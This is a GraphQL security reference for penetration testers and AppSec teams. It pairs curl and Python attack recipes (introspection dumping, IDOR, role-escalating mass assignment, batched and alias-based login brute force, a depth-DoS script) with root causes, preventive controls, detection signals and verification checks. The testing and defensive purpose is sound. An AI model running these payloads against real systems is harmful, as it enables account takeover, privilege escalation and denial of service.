# GraphQL API Security

> API category - 03 GraphQL
> GraphQL is a query language and runtime for APIs. A single endpoint (/graphql), a self-describing schema, and client-controlled query shape.
> The schema is the attack surface: introspection exposes it, batching amplifies it, and nested queries can take it down.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

---

## Table of Contents

- [1. What GraphQL Is](#1-what-graphql-is)
- [2. Detection](#2-detection)
- [3. Enumeration](#3-enumeration)
- [4. Attack Surface Map](#4-attack-surface-map)
- [5. Common Variants](#5-common-variants)
- [6. Exploitation Recipes](#6-exploitation-recipes)
- [7. Post-Exploitation](#7-post-exploitation)
- [8. Risk Context (AppSec)](#8-risk-context-appsec)
- [9. Root Causes (AppSec)](#9-root-causes-appsec)
- [10. Preventive Controls (AppSec)](#10-preventive-controls-appsec)
- [11. Detection Controls (AppSec)](#11-detection-controls-appsec)
- [12. Verification (AppSec)](#12-verification-appsec)
- [13. OSCP Notes](#13-oscp-notes)
- [14. Production Notes](#14-production-notes)
- [15. References](#15-references)

---

## 1. What GraphQL Is

GraphQL is a specification for a typed API. The server defines a schema with types, queries, mutations, and subscriptions. The client sends a single query document describing exactly what it wants.

**Key differences from REST:**

- One endpoint (`/graphql`) instead of many URLs.
- The client controls the response shape - not the server.
- The schema is introspectable (unless disabled).
- Everything is a POST (usually); GET is possible but less common.
- Authorization is per-field or per-resolver, not per-route.

**Practical consequence for pentest:** the attack surface is the schema, not the URL space. Once you have the schema, the entire data model is mapped. The next question is: which fields and mutations lack an authorization check?

**Common stacks:** Apollo Server (Node), graphql-ruby (Rails), graphene (Python), Strawberry (Python), gqlgen (Go), Hot Chocolate (.NET), graphql-java.

---

## 2. Detection

GraphQL endpoints are typically at:

- `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`, `/gql`.
- `/graphql/console` (GraphiQL IDE - often left enabled in dev).

Detection signals:

- `GET /graphql` returns `{"errors":[{"message":"..."}]}` or GraphQL-specific JSON.
- Response to a malformed query contains `"errors"` array with GraphQL-shaped messages.
- `POST /graphql` with `{"query":"{__typename}"}` returns `{"data":{"__typename":"Query"}}`.
- Response headers include `X-Apollo-*`, or the body contains `"extensions"`.

### Quick detection

```bash
# GET probe
curl -s -i "$TARGET/graphql"

# Minimal valid query (works on most schemas)
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'
```

Expected output:

```text
{"data":{"__typename":"Query"}}
```

`__typename` is a meta-field available on every type. If it answers, the endpoint is GraphQL.

---

## 3. Enumeration

### Introspection

GraphQL ships with a built-in query that returns the entire schema. If introspection is enabled in production, the whole data model is public.

```bash
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'
```

### Full introspection to SDL

```bash
# Using graphql-cli / get-graphql-schema
npm install -g get-graphql-schema
get-graphql-schema "$TARGET/graphql" > schema.graphql
```

Or via a Python one-liner:

```bash
python3 -c "
import requests, json
q = {'query':'{__schema{queryType{name} mutationType{name} subscriptionType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}} type{name kind ofType{name kind}}}}}}'}
r = requests.post('$TARGET/graphql', json=q)
print(json.dumps(r.json(), indent=2))
"
```

### If introspection is disabled

Field-name guessing (a.k.a. "GraphQL fuzzing"):

```bash
# Try common field names on the Query type
for f in users user me admin config health version debug; do
  curl -s -X POST "$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $f { __typename } }\"}" | head -c 200
  echo
done
```

Errors of the form `Cannot query field "X" on type "Query"` distinguish existing from non-existing fields. The error message itself is a schema oracle.

### Tools

- **graphql-voyager** - visual schema explorer (run locally against the SDL).
- **InQL** (Burp extension) - automated introspection + query generation.
- **graphw00f** - fingerprint the GraphQL engine (Apollo, graphql-ruby, etc.).
- **clairvoyance** - schema reconstruction when introspection is disabled.

---

## 4. Attack Surface Map

| Surface | What to test |
|---------|--------------|
| Introspection | Enabled in production? `/graphql` answers `__schema`? |
| Query depth | No limit -> nested `{ user { posts { comments { author { posts { ... } } } } } }` |
| Query complexity | No cost limit -> wide queries with aliases |
| Batching | Array of queries in one POST -> brute-force amplification |
| Aliases | Same field many times with different args -> bypass rate limit |
| Field-level authz | `me { email }` works but `users { email }` also works? |
| Mutations | `updateUser`, `deleteUser`, `setRole` - who can call? |
| Subscriptions | WebSocket transport - does authz apply per subscription? |
| Errors | Detailed messages leak schema + stack traces |
| GET method | Some endpoints allow GET with `?query=` - CSRF vector |

---

## 5. Common Variants

### 5.1 Introspection Enabled

The schema is public. Full data model, all mutations, all arguments.

Detection:

```bash
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}'
```

If the response contains `"queryType"`, introspection is on.

### 5.2 Missing Field-Level Authorization

The schema defines `users` and `me`. The resolver for `users` should reject non-admins, but it does not.

```bash
# Allowed
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ me { id email } }"}'

# Should be forbidden, often is not
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email role } }"}'
```

### 5.3 Batching (Brute Force Amplification)

A single HTTP request can contain an array of queries. Rate limiters that count HTTP requests are bypassed.

```bash
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},
       {"query":"mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},
       {"query":"mutation{login(user:\"admin\",pass:\"pass3\"){token}}"}]'
```

1000 logins in one HTTP request -> 1 rate-limit tick.

### 5.4 Alias-Based Rate Limit Bypass

Same trick without the array syntax: use aliases to repeat the same field.

```bash
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{a:login(user:\"admin\",pass:\"p1\"){token} b:login(user:\"admin\",pass:\"p2\"){token} c:login(user:\"admin\",pass:\"p3\"){token}}"}'
```

### 5.5 Depth-Based DoS

No depth limit -> a query that walks a cycle explodes in cost.

```graphql
query {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts { id }
              }
            }
          }
        }
      }
    }
  }
}
```

### 5.6 Mutation Authorization Gaps

Read-only check passes, but the mutation is unguarded.

```bash
# Read own profile (expected)
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{me{id email role}}"}'

# Change own role (should be forbidden)
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id role}}"}'
```

### 5.7 Verbose Errors

Detailed errors leak the schema, resolvers, and sometimes stack traces.

```bash
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ nonExistentField }"}'
```

Expected error pattern:

```text
Cannot query field "nonExistentField" on type "Query". Did you mean "nonExistent"?
```

The `Did you mean` suggestion is a field-name oracle.

---

## 6. Exploitation Recipes

### 6.1 Full introspection dump

```bash
get-graphql-schema "$TARGET/graphql" > schema.graphql
grep -E "type (Query|Mutation)" schema.graphql
```

### 6.2 IDOR through a field

```bash
# Own data
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{user(id:1042){email}}"}'

# Peer data
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{user(id:1043){email}}"}'
```

### 6.3 Mass assignment through a mutation

```bash
curl -s -X POST "$TARGET/graphql" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation{updateMe(input:{email:\"new@example.com\",role:\"admin\"}){id role}}"}'
```

### 6.4 Batching brute force

```bash
python3 - <<'PY'
import requests, json
url = "TARGET/graphql"
pw_list = ["pass1","pass2","pass3"]
batch = [{"query": f'mutation{{login(user:"admin",pass:"{p}"){{token}}}}'} for p in pw_list]
r = requests.post(url, json=batch)
print(r.text)
PY
```

### 6.5 Depth DoS (LAB only)

Do not run against production. In a lab:

```bash
python3 - <<'PY'
import requests
url = "TARGET/graphql"
q = "query { " + "user { posts { comments { author { " * 20 + "id" + " } } } }" * 20 + " }"
r = requests.post(url, json={"query": q}, timeout=60)
print(r.status_code, len(r.text))
PY
```

### 6.6 Introspection-off schema reconstruction

```bash
clairvoyance -o schema.graphql -w /usr/share/seclists/Discovery/Web-Content/graphql.txt "$TARGET/graphql"
```

---

## 7. Post-Exploitation

After a GraphQL foothold:

- Dump the schema again with the new token - reachable types change.
- Enumerate mutations the UI never calls (`deleteUser`, `setRole`, `createApiKey`).
- Check subscriptions over WebSocket - auth is often checked at connection time, not per message.
- Look for `__schema.types[].fields[].args` - argument names hint at internal endpoints (`internalId`, `debug`).
- Check for `@deprecated` fields - they still resolve.

---

## 8. Risk Context (AppSec)

- **Schema exposure:** a single endpoint that documents the entire data model is a design choice. In production, this is often acceptable for internal APIs, but rarely for public ones.
- **Authorization is per-resolver:** unlike REST (where a route guard covers the whole endpoint), GraphQL authorization must be repeated in every resolver. One missed resolver = one BOLA.
- **Batching amplifies everything:** brute force, enumeration, password spraying - all scale linearly with the array size in a single HTTP request.
- **Depth is client-controlled:** a client can send a query the developer never imagined. Without a depth or cost limit, the server's resource consumption is client-decided.

---

## 9. Root Causes (AppSec)

| Root cause | Where it originates |
|------------|---------------------|
| Introspection on in prod | Same config as dev, no environment split |
| Field-level authz missing | Route-level middleware pattern does not map to GraphQL |
| Batching allowed | Default in Apollo Server, not disabled |
| No depth limit | Schema design without cycle analysis |
| No complexity limit | Field costs not annotated |
| Aliases not deduplicated | Rate limiter counts HTTP requests, not fields |
| Error verbosity | `NODE_ENV` not set to `production` |
| GET method allowed | Convenience for the GraphiQL IDE |

---

## 10. Preventive Controls (AppSec)

- **Disable introspection in production.** `ApolloServer({ introspection: process.env.NODE_ENV !== 'production' })`. Same for `graphql-ruby`, `graphene`, `gqlgen`.
- **Depth limit.** `graphql-depth-limit` (Node), `graphql-query-complexity` (Ruby/Python). Reject queries above the threshold.
- **Complexity/cost limit.** Annotate fields with a cost. Reject above the budget.
- **Batching:** either disable array-batching entirely, or rate-limit by query count, not HTTP count.
- **Field-level authorization:** use a directive (`@auth(requires: ADMIN)`) or a middleware (`graphql-shield`, `graphql-guard`).
- **Disable GraphiQL in production.** It exposes the explorer and often the schema.
- **Disable GET.** POST only, with `Content-Type: application/json`.
- **Error responses:** generic to the client, detailed in the server log.
- **Subscription auth:** check authorization on every message, not just at connection time.

---

## 11. Detection Controls (AppSec)

| Signal | Where to look |
|--------|---------------|
| Introspection queries in production | Server logs (`__schema`, `__type`) |
| Deeply nested queries | Query-shape analysis in logs |
| Batching arrays | Request body size + array detection |
| Aliases repeating the same field | Query AST analysis |
| Mutation names never seen in the UI | Logs vs UI telemetry |
| Errors with `Did you mean` in responses | Client-visible errors |
| GET requests to `/graphql` | Gateway logs |

---

## 12. Verification (AppSec)

- **Introspection:** POST `{__schema{queryType{name}}}` -> expect `{"errors":[{"message":"Introspection is disabled"}]}` or a 400.
- **Depth:** a 30-level nested query -> expect 400 or a timeout error, never a 200.
- **Complexity:** a 100-alias query -> expect 400.
- **Batching:** array with 100 logins -> expect one rate-limit tick, not 100.
- **Field authz:** non-admin calls `users { email }` -> expect 403 (or field-level null + error).
- **Mutation authz:** non-admin calls `updateUser(role: "admin")` -> expect 403.
- **GET:** `GET /graphql?query={__typename}` -> expect 405.
- **Error verbosity:** send a malformed query -> response contains no stack trace, no `Did you mean`.

---

## 13. OSCP Notes

GraphQL boxes on OSCP labs tend to expose:

- An endpoint at `/graphql` with introspection on. Dump the schema, read the flag field.
- A mutation that writes to a file or sends an email - used to pivot.
- A subscription with no per-message auth - used to intercept other users' data.

For the report: screenshot the introspection query and the response that shows the target field. Screenshot the mutation that proves the impact (write or privilege change).

---

## 14. Production Notes

- **Do not run depth DoS against production.** It is a real DoS.
- **Batching brute force trips lockout.** Test against a lab account, not a real one.
- **Introspection dumps go into your report.** Treat the SDL as sensitive - it is the whole API map.
- **Alias attacks bypass per-IP rate limits but not per-account.** Combine with account enumeration for full impact.

---

## 15. References

- OWASP API Security Top 10:2023 - API4 (Unrestricted Resource Consumption), API8 (Security Misconfiguration) - https://owasp.org/API-Security/editions/2023/en/0x00-header/
- GraphQL specification - https://spec.graphql.org/October2021/
- OWASP GraphQL Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- PortSwigger GraphQL - https://portswigger.net/web-security/graphql
- GraphQL security - https://github.com/dolevf/graphql-cheat-sheet
- InQL (Burp extension) - https://github.com/doyensec/inql
- clairvoyance - https://github.com/nikitastupin/clairvoyance